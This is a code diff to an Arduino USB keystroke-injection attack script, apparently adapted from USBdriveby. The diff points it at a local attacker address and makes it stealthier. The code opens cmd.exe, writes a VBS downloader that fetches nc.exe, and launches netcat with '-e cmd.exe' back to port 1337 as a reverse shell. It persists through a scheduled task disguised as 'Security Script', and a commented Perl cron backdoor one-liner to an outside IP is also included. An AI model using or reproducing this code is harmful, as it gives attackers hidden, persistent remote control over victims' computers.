@@ -11,11 +11,11 @@
 // here is the ip of the remote dns server we're running which responds to normal DNS requests, but spoofs other requests we specify
 // code for our dns spoofing server is at http://samy.pl/usbdriveby
 
-#define EVIL_SERVER "66.228.55.205"
-String NC_URL = "https://cdn.sparkfun.com/assets/learn_tutorials/1/2/1/SH32U4_driver.zip";
+String EVIL_SERVER = "192.168.44.1";
+String NC_URL = "http://192.168.44.1/nc.exe";
 String NC_SAVE_NAME = "nc.exe";
 String NC_SAVE_PATH = "d:\\";
-String REMOTE_ADDR = "192.168.1.1";
+String REMOTE_ADDR = "192.168.44.1";
 String REMOTE_PORT = "1337";
 
 
@@ -33,18 +33,24 @@ void setup()
   pinMode(LED_PIN, OUTPUT);
 
   // turn the LED on while we're pwning
-  digitalWrite(LED_PIN, HIGH);
+  digitalWrite(LED_PIN, LOW);
 
   // add our reverse tunneling backdoor to
     // cron to run every 5 minutes
   // typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");
   openapp("cmd.exe");
 
+  // Change Drive
   typeln("d:");
 
+  // Download netcat
   get_nc();
 
+  // run netcat and register it to schedule task
   get_shell();
+
+  // exit
+  typeln("exit");
 }
 
 
@@ -53,9 +59,9 @@ void setup()
 void typeln(String chars)
 {
   Keyboard.print(chars);
-  delay(ds);
+//  delay(ds/2);
   Keyboard.println("");
-  delay(ds/2);
+//  delay(ds/2);
 }
 
 // open an application on OS X via spotlight/alfred
@@ -132,7 +138,7 @@ void get_nc()
   file("get_nc.vbs", "    End if   ");
   file("get_nc.vbs", "    Set objXMLHTTP = Nothing   ");
   typeln("get_nc.vbs");
-  delay( ds*4 );
+  delay( ds*4 ); // wait download  nc
 }
 
 void get_shell()
@@ -140,7 +146,7 @@ void get_shell()
   file("backdoor.vbs", "Set objShell = CreateObject(\"WScript.Shell\")  ");
   file("backdoor.vbs", "objShell.Exec(\""+NC_SAVE_PATH+NC_SAVE_NAME+" -d "+REMOTE_ADDR+" "+REMOTE_PORT+" -e c:\\WINDOWS\\system32\\cmd.exe\") ");
   typeln("backdoor.vbs");
-  typeln("schtasks /create /sc minute /mo 5 /tn "Security Script" /tr "+NC_SAVE_PATH+"\\backdoor.vbs")
+  typeln("schtasks /create /sc minute /mo 5 /tn \"Security Script\" /tr "+NC_SAVE_PATH+"\backdoor.vbs");
 }
 
 void loop()
